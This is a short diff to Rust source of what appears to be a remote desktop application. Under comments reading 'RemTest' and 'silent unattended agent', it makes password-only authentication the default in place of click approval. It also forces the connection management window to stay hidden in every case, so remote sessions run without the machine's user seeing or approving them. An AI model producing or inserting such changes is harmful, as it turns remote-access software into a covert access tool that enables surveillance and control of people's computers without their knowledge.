@@ -76,19 +76,17 @@ pub fn has_valid_password() -> bool {
 
 pub fn approve_mode() -> ApproveMode {
     let mode = Config::get_option("approve-mode");
-    if mode == "password" {
-        ApproveMode::Password
-    } else if mode == "click" {
+    if mode == "click" {
         ApproveMode::Click
     } else {
-        ApproveMode::Both
+        // RemTest: default to password-only auth (silent unattended agent).
+        ApproveMode::Password
     }
 }
 
 pub fn hide_cm() -> bool {
-    approve_mode() == ApproveMode::Password
-        && verification_method() == VerificationMethod::OnlyUsePermanentPassword
-        && crate::config::option2bool("allow-hide-cm", &Config::get_option("allow-hide-cm"))
+    // RemTest: always hide the connection management window (silent agent).
+    true
 }
 
 const VERSION_LEN: usize = 2;
